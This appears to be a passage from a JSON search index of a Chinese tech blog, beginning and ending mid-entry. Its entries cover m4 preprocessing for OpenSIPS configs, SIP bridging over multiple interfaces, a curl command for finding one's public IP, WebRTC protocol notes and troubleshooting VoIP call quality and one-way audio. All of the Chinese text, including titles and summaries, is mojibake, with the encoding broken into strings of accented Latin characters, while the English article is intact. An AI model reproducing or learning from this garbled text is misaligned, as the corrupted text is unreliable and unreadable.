å¤„ç†çš„ç›®æ ‡\nå°†æ¯”è¾ƒå¤§çš„è¯·æ±‚è·¯ç”±ï¼ŒæŒ‰ç…§åŠŸèƒ½åˆ’åˆ†å¤šä¸ªå­è·¯ç”±ï¼Œä¸“æ³¨å¤„ç†åŠŸèƒ½å†…éƒ¨çš„äº‹æƒ…ï¼Œåšåˆ°é«˜å†…èšï¼Œä½è€¦åˆã€‚å¯ä»¥ä½¿ç”¨m4çš„includeæŒ‡ä»¤ï¼Œå°†å¤šä¸ªæ–‡ä»¶å¼•å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚å…¶å®OpenSIPSæœ¬èº«ä¹Ÿæœ‰ç±»ä¼¼çš„æŒ‡ä»¤ï¼Œinclude_fileï¼Œä½†æ˜¯è¿™ä¸ªæŒ‡ä»¤å¹¶ä¸æ˜¯ä¼šåœ¨è¿è¡Œå‰ç”Ÿæˆä¸€ä¸ªç»Ÿä¸€çš„ç›®æ ‡æ–‡ä»¶ï¼Œæœ‰æ—¶å€™å‡ºé”™ï¼Œä¸å¥½æ’æŸ¥é—®é¢˜å‡ºç°çš„ä»£ç è¡Œã€‚å¦å¤–Includeçš„æ–‡ä»¶å¤ªå¤šï¼Œä¹Ÿä¸å¥½ç»´æŠ¤ã€‚ å°†é…ç½®æ€§å˜é‡ï¼Œå®šä¹‰æˆm4çš„å®ï¼Œæœ‰m4è´Ÿè´£ç»Ÿä¸€çš„å®å±•å¼€ã€‚é…ç½®æ–‡ä»¶å¯ä»¥å•ç‹¬æ‹¿å‡ºæ¥ï¼Œä¹Ÿå¯ä»¥ç”±m4çš„å‘½ä»¤è¡Œå‚æ•°ä¼ å…¥ã€‚ å…³äºä¸åŒç¯å¢ƒçš„å·®å¼‚åŒ–ç¼–è¯‘ï¼Œå¯ä»¥ä½¿ç”¨m4çš„æ¡ä»¶è¯­å¥ã€‚ä¾‹å¦‚å½“æŸä¸ªå®çš„å®šä¹‰æ—¶å±•å¼€æŸä¸ªè¯­å¥ï¼Œæˆ–è€…æŸä¸ªå®çš„å€¼ç­‰äºæŸä¸ªå€¼åï¼Œå†includeæŸä¸ªæ–‡ä»¶ã€‚è¿™æ ·å°±å¯ä»¥åšåˆ°æ¡ä»¶å±•å¼€å’Œæ¡ä»¶å¼•å…¥ã€‚ ","permalink":"https://wdd.js.org/opensips/ch5/m4/","summary":"ç›¸æ¯”äºkamailoçš„è„šæœ¬çš„é¢„å¤„ç†èƒ½åŠ›ï¼Œopensipsçš„è„šæœ¬ç•¥æ˜¾å•è–„ã€‚OpenSIPSå®˜æ–¹ä¹Ÿè®¤è¯†åˆ°äº†è¿™ä¸€ç‚¹ï¼Œä½†æ˜¯ä¹Ÿå¹¶æœªå‡†å¤‡å¦‚ä½•æé«˜è¿™éƒ¨åˆ†èƒ½åŠ›ã€‚å› ä¸ºOpenSIPSæ˜¯æƒ³å°†é¢„å¤„ç†äº¤ç»™è¿™æ–¹é¢çš„ä¸“å®¶ï¼Œä¹Ÿå°±æ˜¯å¤§åé¼é¼çš„m4(å½“ç„¶ï¼Œä½ å¯èƒ½æ ¹æœ¬ä¸çŸ¥é“m4æ˜¯å•¥)ã€‚\nä¸¾ä¾‹æ¥è¯´ æˆ‘ä»¬çœ‹ä¸€ä¸‹opensipsè‡ªå¸¦è„šæœ¬çš„ä¸­çš„ä¸€å°å—ã€‚ é‡Œé¢å°±æœ‰ä¸‰ä¸ªè¦é…ç½®çš„åœ°æ–¹\nè¿™ä¸ªlistençš„åœ°å€ï¼š listen=udp:127.0.0.1:5060 æ•°æ®åº“åœ°å€çš„é…ç½®ï¼šmodparam(\u0026ldquo;usrloc\u0026rdquo;, \u0026ldquo;db_url\u0026rdquo;, \u0026ldquo;dbdriver://username:password@dbhost/dbname\u0026rdquo;) æ•°æ®åº“åœ°å€çš„é…ç½®ï¼šmodparam(\u0026ldquo;acc\u0026rdquo;, \u0026ldquo;db_url\u0026rdquo;, \u0026ldquo;mysql://user:password@localhost/opensips\u0026rdquo;) auto_aliases=no listen=udp:127.0.0.1:5060 # CUSTOMIZE ME mpath=\u0026#34;/usr/local//lib/opensips/modules/\u0026#34; loadmodule \u0026#34;usrloc.so\u0026#34; modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;dbdriver://username:password@dbhost/dbname\u0026#34;) modparam(\u0026#34;acc\u0026#34;, \u0026#34;early_media\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;report_cancels\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;detect_direction\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://user:password@localhost/opensips\u0026#34;) éšç€è„šæœ¬ä»£ç çš„å¢å¤šï¼Œå„ç§é…ç½®å¾€å¾€è¶Šæ¥è¶Šå¤šã€‚çœŸæ˜¯è„šæœ¬é‡Œï¼Œé…ç½®çš„åœ°æ–¹è¿œè¿œä¸æ­¢ä¸‰å¤„ï¼\nä½ å¼€å‘äº†OpenSIPSçš„è„šæœ¬ï¼Œä½†æ˜¯çœŸæ­£éƒ¨ç½²çš„æœåŠ¡çš„å¯èƒ½æ˜¯å…¶ä»–äººã€‚é‚£ä¹ˆå…¶ä»–æ‹¿åˆ°ä½ çš„è„šæœ¬çš„æ—¶å€™ï¼Œä»–ä»¬æ€ä¹ˆçŸ¥é“è¦æ”¹å“ªäº›åœ°æ–¹å‘¢ï¼Œéš¾é“è¦æœç´¢ä¸€ä¸‹ï¼Œæ‰€æœ‰å‡ºç°#CUSTOMIZE MEçš„åœ°æ–¹å°±æ˜¯éœ€è¦é…ç½®çš„ï¼Ÿ éš¾é“ä»–ä»¬æ¯æ¬¡éƒ¨ç½²ä¸€ä¸ªæœåŠ¡ï¼Œå°±è¦æ”¹ä¸€éè„šæœ¬çš„å†…å®¹ï¼Ÿ æ”¹é”™äº†è°è´Ÿè´£ï¼Ÿ\nå¦‚æœä½ ä¸æƒ³è¢«è¿ç»´äººå‘˜åœ¨èƒŒåéª‚å¨˜ï¼Œå°±ä¸è¦æŠŠé…ç½®æ€§çš„æ•°æ®å†™æ­»åˆ°è„šæœ¬é‡Œï¼\nå¦‚æœä½ ä¸æƒ³åœ¨æ‰“æ¸¸æˆçš„æ—¶å€™è¢«è¿ç»´äººå‘˜ç‚¹ç”µè¯é—®è¿™ä¸ªé…ç½®å‡ºé”™åº”è¯¥æ€ä¹ˆè§£å†³ï¼Œå°±ä¸è¦æŠŠé…ç½®å‹æ•°æ®å†™æ­»åˆ°è„šæœ¬é‡Œï¼\n** é‚£ä¹ˆï¼Œä½ å°±éœ€è¦ç”¨åˆ°M4**\nä»€ä¹ˆæ˜¯M4ï¼Ÿ M4æ˜¯ä¸€ç§å®è¯­è¨€ï¼Œå¦‚æœä½ ä¸æ¸…æ¥šä»€ä¹ˆæ˜¯å®ï¼Œä½ å°±å¯ä»¥æŠŠM4æƒ³æƒ³æˆä¸€ç§å­—ç¬¦ä¸²æ›¿æ¢çš„å·¥å…·ã€‚\nå¦‚ä½•å®‰è£…M4? å¤§éƒ¨åˆ†Linuxä¸Šéƒ½å·²ç»é»˜è®¤å®‰è£…äº†m4, ä½ å¯ä»¥ç”¨m4 --versionæ£€æŸ¥ä¸€ä¸‹m4æ˜¯å¦å·²ç»å­˜åœ¨ã€‚\nm4 --version Copyright Â© 2021 Free Software Foundation, Inc. GPLv3+ è®¸å¯è¯: GNU é€šç”¨å…¬å…±è®¸å¯è¯ç¬¬ä¸‰ç‰ˆæˆ–æ›´é«˜ç‰ˆæœ¬ \u0026lt;https://gnu.org/licenses/gpl.html\u0026gt;ã€‚ è¿™æ˜¯è‡ªç”±è½¯ä»¶: æ‚¨å¯è‡ªç”±æ›´æ”¹å¹¶é‡æ–°åˆ†å‘å®ƒã€‚ åœ¨æ³•å¾‹æ‰€å…è®¸çš„èŒƒå›´å†…ï¼Œä¸é™„å¸¦ä»»ä½•æ‹…ä¿æ¡æ¬¾ã€‚ å¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå¯ä»¥ç”¨å¯¹åº”å¸¸ç”¨çš„åŒ…ç®¡ç†å·¥å…·æ¥å®‰è£…ï¼Œä¾‹å¦‚\napt-get install m4 èƒ½å¦ä¸¾ä¸ªm4ä¾‹å­ï¼Ÿ hello-world.","title":"ä½¿ç”¨m4å¢å¼ºopensips.cfgè„šæœ¬é¢„å¤„ç†èƒ½åŠ›"},{"content":"There are scenarios where you need OpenSIPS to route SIP traffic across more than one IP interface. Such a typical scenario is where OpenSIPS is required to perform bridging. The bridging may be between different IP networks (like public versus private, IPv4 versus IPv6) or between different transport protocols for SIP (like UDP versus TCP versus TLS).So, how do we switch to a different outbound interface in OpenSIPS ?\nAuto detection OpenSIPS has a built in automatic way of picking up the right outbound interface, the so called â€œMulti homedâ€ support or shortly â€œmhomedâ€, controlled by the mhomed core parameter.The auto detection is done based on the destination IP of the SIP message. OpenSIPS will â€˜queryâ€™ the kernel routing table to see which interface (on the server) is able to route to the needed destination IP.\nExample If we have an OpenSIPS listening on 1.2.3.4 public interface and 10.0.0.4 private interface and we need to send the SIP message to 10.0.0.100, the kernel will indicate that 10.0.0.100 is reachable/routable only via 10.0.0.4, so OpenSIPS will use that listener.\nAdvantages This a very easy way to achieve multi-interface routing, without any extra scripting logic. You just have to switch a single option and it simply works.\nDisadvantages First of all there is performance penalty here as each time a SIP message is sent out OpenSIPS will have to query the kernel for the right outbound interface.Also there are some limitation â€“ as this auto detection is based on the kernel routing table, this approach can be used only when routing between different types of networks like private versus public or IPv4 versus IPv6. It cannot be used for switching between different SIP transport protocols.Even more, there is another limitation here â€“ you need to correlate the kernel IP routing table with the listeners you have in OpenSIPS, otherwise you may end up in a situation where the kernel indicates as outbound interface an IP that it is not configured as listener in OpenSIPS!\nManual selection An alternative is to explicitly indicate to OpenSIPS what the outbound interface should be, based on the logic from the routing script. Like if my routing logic says that the call is to be sent to an end-point and I know that all my end-points are on the public network, then I can manually indicate OpenSIPS to use the listener on the public network. Or if my routing logic says that the call goes to a media server located in a private network, then I will instruct OpenSIPS to use the private listener.How do you do this? You can indicate the outbound interface/socket by â€œforcing the send socketâ€ with the $fs variable.As the send socket description also contains indication for the transport protocol, this approach can be used for switching between different SIP transport protocols:\n# switch from TCP to UDP, preserving the IP if ($proto == \u0026#34;TCP\u0026#34;) $fs = \u0026#34;udp:\u0026#34; + $Ri + \u0026#34;:5060\u0026#34;; Manually setting the outbound interface is usually done only for the initial requests (without the To header â€œ;tag=â€ parameter). Why? As you have to anchor the dialog into your OpenSIPS (otherwise the sequential requests will not be routed in bridging mode), you will do either record_route(), either topology_hiding(). These two ways of anchoring dialogs in OpenSIPS guarantees that all sequential requests will follow the same interface switching / bridging as the initial request. Like if you do the interface switch at INVITE time, there is no need for additional scripting for in-dialog requests (ACK, re-INVITE, BYE, etc.). Shortly, any custom interface handling is to be done only for the initial requests.\nExample Assuming the end-points are in the public interface and the media servers are in the private network, letâ€™s see how the logic should be.But first, an useful hint : if your routing is based on lookup(â€œlocationâ€), there is no need to do manual setting of the outbound interface as the lookup() function will do this for you â€“ it will automatically force as outbound interface the interface the corresponding REGISTER was received on ;).\n# is it a call to a media service (format *33xxxxx) ? if ($rU=~\u0026#34;^*33[0-9]+$\u0026#34;)) { $fs = \u0026#34;udp:10.0.0.100:5060\u0026#34;; route(to_media); exit; } Advantages This is a very rigorous way of controlling the interface switching in your OpenSIPS script, being able to cover all cases of network or protocol switching.Also, this adds zero performance penalty!\nDisadvantages You need to do some extra scripting and to correlate your SIP routing logic with the IP/transport switching logic. Nevertheless, it is very easy to do â€“ just set a variable, so it will not pollute your script.\nConclusions Each approach has some clear advantages â€“ if the auto-detection is very very simple to use for some simple scenarios, the manual selection is more powerful and complex but needs some extra scripting and SIP understanding.If you want to learn more, join us for the upcoming OpenSIPS Bootcamp training session and become a skillful OpenSIPS user! :).\nåŸæ–‡åœ°å€ï¼šhttps://blog.opensips.org/2018/09/04/sip-bridging-over-multiple-interfaces/\n","permalink":"https://wdd.js.org/opensips/blog/mutltiple-interface/","summary":"There are scenarios where you need OpenSIPS to route SIP traffic across more than one IP interface. Such a typical scenario is where OpenSIPS is required to perform bridging. The bridging may be between different IP networks (like public versus private, IPv4 versus IPv6) or between different transport protocols for SIP (like UDP versus TCP versus TLS).So, how do we switch to a different outbound interface in OpenSIPS ?\nAuto detection OpenSIPS has a built in automatic way of picking up the right outbound interface, the so called â€œMulti homedâ€ support or shortly â€œmhomedâ€, controlled by the mhomed core parameter.","title":"SIP bridging over multiple interfaces"},{"content":"curl ip.sb curl cip.cc ","permalink":"https://wdd.js.org/posts/2020/07/bh7hy0/","summary":"curl ip.sb curl cip.cc ","title":"è·å–æœ¬æœºå¤–éƒ¨å…¬ç½‘IP"},{"content":"æ ‡å‡†æ–‡æ¡£ WebRTC https://w3c.github.io/webrtc-pc/ MediaStream https://www.w3.org/TR/mediacapture-streams/ å®ç°æ¥å£ MediaStream: è·å–åª’ä½“æµï¼Œä¾‹å¦‚ä»ç”¨æˆ·çš„æ‘„åƒæœºæˆ–è€…éº¦å…‹é£ RTCPeerConnection: éŸ³é¢‘æˆ–è€…è§†é¢‘å‘¼å«ï¼Œä»¥åŠåŠ å¯†å’Œå¸¦å®½ç®¡ç† RTCDataChannel: ç«¯åˆ°ç«¯çš„æ•°æ®äº¤äº’ WebRTCæ¶æ„ æ¶æ„å›¾é¢œè‰²æ ‡è¯†è¯´æ˜ï¼š\nç´«è‰²éƒ¨åˆ†æ˜¯Webå¼€å‘è€…APIå±‚ è“è‰²å®çº¿éƒ¨åˆ†æ˜¯é¢å‘æµè§ˆå™¨å‚å•†çš„APIå±‚ è“è‰²è™šçº¿éƒ¨åˆ†æµè§ˆå™¨å‚å•†å¯ä»¥è‡ªå®šä¹‰å®ç° WebRTCæœ‰ä¸‰ä¸ªæ¨¡å—ï¼š\nVoice Engineï¼ˆéŸ³é¢‘å¼•æ“ï¼‰ Voice EngineåŒ…å«iSAC/iLBC Codecï¼ˆéŸ³é¢‘ç¼–è§£ç å™¨ï¼Œå‰è€…æ˜¯é’ˆå¯¹å®½å¸¦å’Œè¶…å®½å¸¦ï¼Œåè€…æ˜¯é’ˆå¯¹çª„å¸¦ï¼‰ NetEQ for voiceï¼ˆå¤„ç†ç½‘ç»œæŠ–åŠ¨å’Œè¯­éŸ³åŒ…ä¸¢å¤±ï¼‰ Echo Cancelerï¼ˆå›å£°æ¶ˆé™¤å™¨ï¼‰/ Noise Reductionï¼ˆå™ªå£°æŠ‘åˆ¶ï¼‰ Video Engineï¼ˆè§†é¢‘å¼•æ“ï¼‰ VP8 Codecï¼ˆè§†é¢‘å›¾åƒç¼–è§£ç å™¨ï¼‰ Video jitter bufferï¼ˆè§†é¢‘æŠ–åŠ¨ç¼“å†²å™¨ï¼Œå¤„ç†è§†é¢‘æŠ–åŠ¨å’Œè§†é¢‘ä¿¡æ¯åŒ…ä¸¢å¤±ï¼‰ Image enhancementsï¼ˆå›¾åƒè´¨é‡å¢å¼ºï¼‰ Transport SRTPï¼ˆå®‰å…¨çš„å®æ—¶ä¼ è¾“åè®®ï¼Œç”¨ä»¥éŸ³è§†é¢‘æµä¼ è¾“ï¼‰ Multiplexingï¼ˆå¤šè·¯å¤ç”¨ï¼‰ P2Pï¼ŒSTUN+TURN+ICEï¼ˆç”¨äºNATç½‘ç»œå’Œé˜²ç«å¢™ç©¿è¶Šçš„ï¼‰ é™¤æ­¤ä¹‹å¤–ï¼Œå®‰å…¨ä¼ è¾“å¯èƒ½è¿˜ä¼šç”¨åˆ°DTLSï¼ˆæ•°æ®æŠ¥å®‰å…¨ä¼ è¾“ï¼‰ï¼Œç”¨äºåŠ å¯†ä¼ è¾“å’Œå¯†é’¥åå•† æ•´ä¸ªWebRTCé€šä¿¡æ˜¯åŸºäºUDPçš„ WebRTCåº•å±‚åè®® WebRTC æ ¸å¿ƒçš„åè®®éƒ½æ˜¯åœ¨å³ä¾§åŸºäº UDP åŸºç¡€ä¸Šæ­å»ºèµ·æ¥çš„ã€‚\nå…¶ä¸­ï¼ŒICEã€STUNã€TURN ç”¨äºå†…ç½‘ç©¿é€, è§£å†³äº†è·å–ä¸ç»‘å®šå¤–ç½‘æ˜ å°„åœ°å€ï¼Œä»¥åŠ keep alive æœºåˆ¶\nDTLS ç”¨äºå¯¹ä¼ è¾“å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥çœ‹åšæ˜¯ UDP ç‰ˆçš„ TLSã€‚ç”±äº WebRTC å¯¹å®‰å…¨æ¯”è¾ƒé‡è§†ï¼Œè¿™ä¸€å±‚æ˜¯å¿…é¡»çš„ã€‚æ‰€æœ‰WebRTCç»„ä»¶éƒ½å¿…é¡»åŠ å¯†ï¼Œå¹¶ä¸”å…¶JavaScript APIåªèƒ½ç”¨äºå®‰å…¨æºï¼ˆHTTPSæˆ–æœ¬åœ°ä¸»æœºï¼‰ã€‚ä¿¡ä»¤æœºåˆ¶å¹¶ä¸æ˜¯ç”±WebRTCæ ‡å‡†å®šä¹‰çš„ï¼Œæ‰€ä»¥æ‚¨å¿…é¡»ç¡®ä¿ä½¿ç”¨å®‰å…¨åè®®ã€‚ SRTP ä¸ SRTCP æ˜¯å¯¹åª’ä½“æ•°æ®çš„å°è£…ä¸ä¼ è¾“æ§åˆ¶åè®® SCTP æ˜¯æµæ§åˆ¶ä¼ è¾“åè®®ï¼Œæä¾›ç±»ä¼¼ TCP çš„ç‰¹æ€§ï¼ŒSCTP å¯ä»¥åŸºäº UDP ä¸Šæ„å»ºï¼Œåœ¨ WebRTC é‡Œæ˜¯åœ¨ DTLS åè®®ä¹‹ä¸Š RTCPeerConnection ç”¨æ¥å»ºç«‹å’Œç»´æŠ¤ç«¯åˆ°ç«¯è¿æ¥ï¼Œå¹¶æä¾›é«˜æ•ˆçš„éŸ³è§†é¢‘æµä¼ è¾“ RTCDataChannel ç”¨æ¥æ”¯æŒç«¯åˆ°ç«¯çš„ä»»æ„äºŒè¿›åˆ¶æ•°æ®ä¼ è¾“ WebRTC åè®®æ ˆè§£é‡Š\nICEï¼šäº’åŠ¨å¼è¿æ¥å»ºç«‹ï¼ˆRFC 5245ï¼‰ STUNï¼šç”¨äºNATçš„ä¼šè¯éå†å®ç”¨ç¨‹åºï¼ˆRFC 5389ï¼‰ TURNï¼šåœ¨NATå‘¨å›´ä½¿ç”¨ç»§ç”µå™¨è¿›è¡Œéå†ï¼ˆRFC 5766ï¼‰ SDPï¼šä¼šè¯æè¿°åè®®ï¼ˆRFC 4566ï¼‰ DTLSï¼šæ•°æ®æŠ¥ä¼ è¾“å±‚å®‰å…¨æ€§ï¼ˆRFC 6347ï¼‰ SCTPï¼šæµæ§åˆ¶ä¼ è¾“åè®®ï¼ˆRFC 4960ï¼‰ SRTPï¼šå®‰å…¨å®æ—¶ä¼ è¾“åè®®ï¼ˆRFC 3711ï¼‰ ","permalink":"https://wdd.js.org/fe/webrtc-notes/","summary":"æ ‡å‡†æ–‡æ¡£ WebRTC https://w3c.github.io/webrtc-pc/ MediaStream https://www.w3.org/TR/mediacapture-streams/ å®ç°æ¥å£ MediaStream: è·å–åª’ä½“æµï¼Œä¾‹å¦‚ä»ç”¨æˆ·çš„æ‘„åƒæœºæˆ–è€…éº¦å…‹é£ RTCPeerConnection: éŸ³é¢‘æˆ–è€…è§†é¢‘å‘¼å«ï¼Œä»¥åŠåŠ å¯†å’Œå¸¦å®½ç®¡ç† RTCDataChannel: ç«¯åˆ°ç«¯çš„æ•°æ®äº¤äº’ WebRTCæ¶æ„ æ¶æ„å›¾é¢œè‰²æ ‡è¯†è¯´æ˜ï¼š\nç´«è‰²éƒ¨åˆ†æ˜¯Webå¼€å‘è€…APIå±‚ è“è‰²å®çº¿éƒ¨åˆ†æ˜¯é¢å‘æµè§ˆå™¨å‚å•†çš„APIå±‚ è“è‰²è™šçº¿éƒ¨åˆ†æµè§ˆå™¨å‚å•†å¯ä»¥è‡ªå®šä¹‰å®ç° WebRTCæœ‰ä¸‰ä¸ªæ¨¡å—ï¼š\nVoice Engineï¼ˆéŸ³é¢‘å¼•æ“ï¼‰ Voice EngineåŒ…å«iSAC/iLBC Codecï¼ˆéŸ³é¢‘ç¼–è§£ç å™¨ï¼Œå‰è€…æ˜¯é’ˆå¯¹å®½å¸¦å’Œè¶…å®½å¸¦ï¼Œåè€…æ˜¯é’ˆå¯¹çª„å¸¦ï¼‰ NetEQ for voiceï¼ˆå¤„ç†ç½‘ç»œæŠ–åŠ¨å’Œè¯­éŸ³åŒ…ä¸¢å¤±ï¼‰ Echo Cancelerï¼ˆå›å£°æ¶ˆé™¤å™¨ï¼‰/ Noise Reductionï¼ˆå™ªå£°æŠ‘åˆ¶ï¼‰ Video Engineï¼ˆè§†é¢‘å¼•æ“ï¼‰ VP8 Codecï¼ˆè§†é¢‘å›¾åƒç¼–è§£ç å™¨ï¼‰ Video jitter bufferï¼ˆè§†é¢‘æŠ–åŠ¨ç¼“å†²å™¨ï¼Œå¤„ç†è§†é¢‘æŠ–åŠ¨å’Œè§†é¢‘ä¿¡æ¯åŒ…ä¸¢å¤±ï¼‰ Image enhancementsï¼ˆå›¾åƒè´¨é‡å¢å¼ºï¼‰ Transport SRTPï¼ˆå®‰å…¨çš„å®æ—¶ä¼ è¾“åè®®ï¼Œç”¨ä»¥éŸ³è§†é¢‘æµä¼ è¾“ï¼‰ Multiplexingï¼ˆå¤šè·¯å¤ç”¨ï¼‰ P2Pï¼ŒSTUN+TURN+ICEï¼ˆç”¨äºNATç½‘ç»œå’Œé˜²ç«å¢™ç©¿è¶Šçš„ï¼‰ é™¤æ­¤ä¹‹å¤–ï¼Œå®‰å…¨ä¼ è¾“å¯èƒ½è¿˜ä¼šç”¨åˆ°DTLSï¼ˆæ•°æ®æŠ¥å®‰å…¨ä¼ è¾“ï¼‰ï¼Œç”¨äºåŠ å¯†ä¼ è¾“å’Œå¯†é’¥åå•† æ•´ä¸ªWebRTCé€šä¿¡æ˜¯åŸºäºUDPçš„ WebRTCåº•å±‚åè®® WebRTC æ ¸å¿ƒçš„åè®®éƒ½æ˜¯åœ¨å³ä¾§åŸºäº UDP åŸºç¡€ä¸Šæ­å»ºèµ·æ¥çš„ã€‚\nå…¶ä¸­ï¼ŒICEã€STUNã€TURN ç”¨äºå†…ç½‘ç©¿é€, è§£å†³äº†è·å–ä¸ç»‘å®šå¤–ç½‘æ˜ å°„åœ°å€ï¼Œä»¥åŠ keep alive æœºåˆ¶\nDTLS ç”¨äºå¯¹ä¼ è¾“å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥çœ‹åšæ˜¯ UDP ç‰ˆçš„ TLSã€‚ç”±äº WebRTC å¯¹å®‰å…¨æ¯”è¾ƒé‡è§†ï¼Œè¿™ä¸€å±‚æ˜¯å¿…é¡»çš„ã€‚æ‰€æœ‰WebRTCç»„ä»¶éƒ½å¿…é¡»åŠ å¯†ï¼Œå¹¶ä¸”å…¶JavaScript APIåªèƒ½ç”¨äºå®‰å…¨æºï¼ˆHTTPSæˆ–æœ¬åœ°ä¸»æœºï¼‰ã€‚ä¿¡ä»¤æœºåˆ¶å¹¶ä¸æ˜¯ç”±WebRTCæ ‡å‡†å®šä¹‰çš„ï¼Œæ‰€ä»¥æ‚¨å¿…é¡»ç¡®ä¿ä½¿ç”¨å®‰å…¨åè®®ã€‚ SRTP ä¸ SRTCP æ˜¯å¯¹åª’ä½“æ•°æ®çš„å°è£…ä¸ä¼ è¾“æ§åˆ¶åè®® SCTP æ˜¯æµæ§åˆ¶ä¼ è¾“åè®®ï¼Œæä¾›ç±»ä¼¼ TCP çš„ç‰¹æ€§ï¼ŒSCTP å¯ä»¥åŸºäº UDP ä¸Šæ„å»ºï¼Œåœ¨ WebRTC é‡Œæ˜¯åœ¨ DTLS åè®®ä¹‹ä¸Š RTCPeerConnection ç”¨æ¥å»ºç«‹å’Œç»´æŠ¤ç«¯åˆ°ç«¯è¿æ¥ï¼Œå¹¶æä¾›é«˜æ•ˆçš„éŸ³è§†é¢‘æµä¼ è¾“ RTCDataChannel ç”¨æ¥æ”¯æŒç«¯åˆ°ç«¯çš„ä»»æ„äºŒè¿›åˆ¶æ•°æ®ä¼ è¾“ WebRTC åè®®æ ˆè§£é‡Š","title":"Webrtc Notes"},{"content":"é€šè¯è´¨é‡å·®ï¼Œä¸€èˆ¬å¯èƒ½ä»¥ä¸‹å› ç´ æœ‰å…³ã€‚\nåª’ä½“æœåŠ¡å™¨æˆ–è€…åª’ä½“ä»£ç†æœåŠ¡å™¨CPU, å†…å­˜å¼‚å¸¸ é€šä¿¡ç½‘ç»œå·® ä¸­ç»§æˆ–è€…ç½‘å…³é€è¿‡æ¥çš„æœ¬æ¥éŸ³è´¨å°±ä¸å¥½ã€‚ è§£å†³æ€è·¯ï¼š\nè¿™ä¸ªéœ€è¦ç›‘æ§åª’ä½“æœåŠ¡å™¨æˆ–è€…åª’ä½“ä»£ç†CPUï¼Œå†…å­˜æ˜¯å¦æ­£å¸¸ ä¹Ÿå¯ä»¥åœ¨åª’ä½“ä»£ç†ä¸Šç”¨tupdumpæŠ“åŒ…ï¼Œç„¶åç”¨wiresharkåˆ†æ è°ƒå¬æœåŠ¡ç«¯çš„å½•éŸ³ï¼Œçœ‹çœ‹æœåŠ¡ç«¯å½•éŸ³æ˜¯å¦ä¹Ÿå­˜åœ¨éŸ³è´¨å·®çš„é—®é¢˜ ","permalink":"https://wdd.js.org/opensips/ch7/poor-quality/","summary":"é€šè¯è´¨é‡å·®ï¼Œä¸€èˆ¬å¯èƒ½ä»¥ä¸‹å› ç´ æœ‰å…³ã€‚\nåª’ä½“æœåŠ¡å™¨æˆ–è€…åª’ä½“ä»£ç†æœåŠ¡å™¨CPU, å†…å­˜å¼‚å¸¸ é€šä¿¡ç½‘ç»œå·® ä¸­ç»§æˆ–è€…ç½‘å…³é€è¿‡æ¥çš„æœ¬æ¥éŸ³è´¨å°±ä¸å¥½ã€‚ è§£å†³æ€è·¯ï¼š\nè¿™ä¸ªéœ€è¦ç›‘æ§åª’ä½“æœåŠ¡å™¨æˆ–è€…åª’ä½“ä»£ç†CPUï¼Œå†…å­˜æ˜¯å¦æ­£å¸¸ ä¹Ÿå¯ä»¥åœ¨åª’ä½“ä»£ç†ä¸Šç”¨tupdumpæŠ“åŒ…ï¼Œç„¶åç”¨wiresharkåˆ†æ è°ƒå¬æœåŠ¡ç«¯çš„å½•éŸ³ï¼Œçœ‹çœ‹æœåŠ¡ç«¯å½•éŸ³æ˜¯å¦ä¹Ÿå­˜åœ¨éŸ³è´¨å·®çš„é—®é¢˜ ","title":"é€šè¯è´¨é‡å·®"},{"content":" è¿™ä¸ªé—®é¢˜å¾ˆå¤§å¯èƒ½å’Œå’ŒSDPæ²¡æœ‰æ­£ç¡®ä¿®æ”¹æœ‰å…³ã€‚éœ€è¦æ’æŸ¥SIPä¿¡ä»¤çš„sdpåœ°å€æ˜¯å¦æ­£ç¡®ã€‚ é˜²ç«å¢™ç­–ç•¥é—®é¢˜ï¼šæœ‰çš„ç½‘ç»œå…è®¸udpå‡ºå»ï¼Œä½†æ˜¯ä¸å…è®¸udpè¿›æ¥ã€‚éœ€è¦è®¾ç½®é˜²ç«å¢™ç­–ç•¥ã€‚ udpç«¯å£èŒƒå›´å¤ªå°ã€‚ä¸€èˆ¬ä¸€ä¸ªé€šè¯éœ€è¦å ç”¨4ä¸ªudpç«¯å£ã€‚å¦‚æœå¼€æ”¾çš„udpç«¯å£å¤ªå°‘ï¼Œåœ¨é€šè¯è¾¾åˆ°ä¸€å®šæ•°é‡åï¼Œå°±ä¼šå‡ºç°ä¸€éƒ¨åˆ†å‘¼å«æ²¡æœ‰å¯ç”¨ç«¯å£ã€‚ ç”¨æˆ·è®¾å¤‡çš„é—®é¢˜ã€‚ä¾‹å¦‚ç”¨æˆ·çš„ç”µè„‘å£°å¡æˆ–è€…æ‰¬å£°å™¨å‡ºç°é—®é¢˜ã€‚ ç”±äºç½‘ç»œçš„å¤æ‚æ€§ï¼Œè¿˜æœ‰å¾ˆå¤šå¯èƒ½ ä¸€èˆ¬é‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥æŒ‰ç…§å¦‚ä¸‹çš„æ€è·¯æ’æŸ¥ï¼š\næœåŠ¡ç«¯æœ‰å½•éŸ³åŠŸèƒ½çš„ï¼Œå¯ä»¥å…ˆåœ¨æœåŠ¡ç«¯å¬å½•éŸ³ï¼Œçœ‹çœ‹æœåŠ¡ç«¯å½•éŸ³é‡Œæ˜¯å¦æ­£å¸¸ã€‚ä¸€èˆ¬æ¥è¯´æœ‰å››ç§æƒ…å†µã€‚ ä¸¤æ–¹çš„å½•éŸ³éƒ½æ²¡æœ‰ ä¸»å«æ–¹æœ‰ï¼Œè¢«å«æ–¹æ²¡æœ‰ è¢«å«æ–¹æœ‰ï¼Œä¸»å«æ–¹æ²¡æœ‰ ä¸»è¢«å«éƒ½æœ‰ã€‚ä½†æ˜¯å°±æ˜¯ä¸€æ–¹å¬ä¸åˆ°å¦ä¸€æ–¹ã€‚ é€šè¿‡æ’æŸ¥æœåŠ¡ç«¯çš„å½•éŸ³ï¼Œå°±å¯ä»¥å¤§è‡´çŸ¥é“åˆ°åº•æ˜¯ABä¸¤ä¸ªleg, 